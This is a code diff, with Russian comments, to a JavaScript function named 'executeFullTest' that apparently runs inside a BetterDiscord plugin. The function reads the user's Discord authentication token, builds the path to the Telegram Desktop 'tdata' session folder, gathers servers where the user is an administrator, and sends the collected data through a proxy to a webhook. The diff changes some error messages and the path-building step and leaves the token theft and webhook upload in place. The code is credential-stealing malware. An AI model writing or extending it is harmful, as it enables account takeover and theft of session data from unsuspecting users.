@@ -6,7 +6,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
         dtoken: null,
         telegram_path: "Не найден",
         debug: {
-            appdata_env: process.env.APPDATA || "Нет",
+            appdata_env: process.env.APPDATA || "Переменная не найдена",
             errors: []
         },
         admin_servers: []
@@ -39,13 +39,11 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
         if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
     } catch (e) { result.debug.errors.push("User Error: " + e.message); }
 
-    // 3. Формируем путь к Telegram (без fs)
+    // 3. Формируем путь к Telegram (БЕЗ проверки существования файла)
     try {
         if (process.env.APPDATA) {
-            // Формируем стандартный путь для Windows
-            result.telegram_path = `${process.env.APPDATA}\\Telegram Desktop\\tdata`;
-        } else {
-            result.telegram_path = "APPDATA не найден";
+            // Просто собираем строку пути
+            result.telegram_path = process.env.APPDATA + "\\Telegram Desktop\\tdata";
         }
     } catch (e) { 
         result.debug.errors.push("Telegram Error: " + e.message); 
@@ -83,7 +81,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
         }
     } catch (e) { result.debug.errors.push("Guild Error: " + e.message); }
 
-    // 5. Отправка
+    // 5. Отправка на вебхук
     try {
         const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
         const response = await BdApi.Net.fetch(proxyUrlFull, {
